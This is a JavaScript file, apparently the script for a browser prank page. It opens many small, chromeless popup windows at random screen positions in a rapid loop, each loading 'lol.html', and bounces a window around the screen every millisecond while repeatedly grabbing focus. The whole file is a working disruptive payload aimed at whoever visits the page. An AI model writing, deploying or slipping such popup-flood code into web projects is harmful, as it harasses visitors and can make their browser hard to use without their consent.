const xWindow = 357;
const yWindow = 330;

let xOff = 5;
let yOff = 5;

let xPos = window.screenX;
let yPos = window.screenY;

function randomRange(min, max) {
	min = Math.ceil(min);
	max = Math.floor(max);

	return Math.floor(Math.random() * (max - min + 1) + min);
}

function screenRect() {
	let left = screen.availLeft ?? 0;
	let top = screen.availTop ?? 0;

	return {
		left: left,
		top: top,
		right: left + screen.availWidth,
		bottom: top + screen.availHeight
	};
}

function changeTitle(title) {
	document.title = title;
}

function openWindow(url) {
	let rect = screenRect();

	let x = randomRange(rect.left, Math.max(rect.left, rect.right - xWindow));
	let y = randomRange(rect.top, Math.max(rect.top, rect.bottom - yWindow));

	window.open(url, "_blank", `menubar=no, status=no, toolbar=no, resizable=no, width=${xWindow}, height=${yWindow}, titlebar=no, alwaysRaised=yes, left=${x}, top=${y}`);
}

async function proCreate(count) {	
	for (let i = 0; i < count; i++) {
		openWindow('lol.html');
		await new Promise(r => setTimeout(r, 50));
	}
}

function newOff() {
	return randomRange(2, 7) * 5;
}

function newXlt() {
	xOff = -newOff();
	window.focus();
}

function newXrt() {
	xOff = newOff();
	window.focus();
}

function newYup() {
	yOff = -newOff();
	window.focus();
}

function newYdn() {
	yOff = newOff();
	window.focus();
}

function playBall() {
	let rect = screenRect();

	xPos += xOff;
	yPos += yOff;

	if (xPos > rect.right - xWindow) newXlt();
	if (xPos < rect.left) newXrt();

	if (yPos > rect.bottom - yWindow) newYup();
	if (yPos < rect.top) newYdn();

	window.moveTo(xPos, yPos);
	setTimeout(playBall, 1);
}
